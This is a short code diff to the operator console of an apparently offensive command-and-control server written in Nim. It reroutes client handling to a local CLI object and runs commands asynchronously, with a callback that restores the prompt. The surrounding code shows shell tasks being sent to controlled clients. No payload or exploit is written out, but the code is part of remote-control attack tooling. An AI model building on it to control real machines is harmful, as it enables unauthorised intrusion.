@@ -37,10 +37,10 @@ proc procStdin*(server: C2Server) {.async.} =
         if cmd == "back":
           c2cli.mode = ClientInteractMode
         else:
-          for client in server.cli.handlingClient:
+          for client in c2cli.handlingClient:
             let task = await client.sendClientTask("shell", %*[ args.join(" ") ])
             if not task.isNil(): 
-              server.cli.waitingForOutput = true
+              c2cli.waitingForOutput = true
       else:
         for command in c2cli.commands:
           if command.name == cmd or cmd in command.aliases:
@@ -66,13 +66,20 @@ proc procStdin*(server: C2Server) {.async.} =
 
               c2cli.lastCommand = input
 
-              await command.execProc(
+              let commandFuture = command.execProc(
                 cmd=command,
                 originalCommand=input,
                 flags=flags,
                 args=parsedArgs,
                 server=server
               )
+              proc cb() {.closure, gcsafe.} = 
+                if c2cli.waitingForOutput:
+                  c2cli.waitingForOutput = false
+                  prompt(server)
+              asyncCheck commandFuture
+              commandFuture.addCallback(cb)
+
             c2cli.interactive = true
 
       prompt(server)
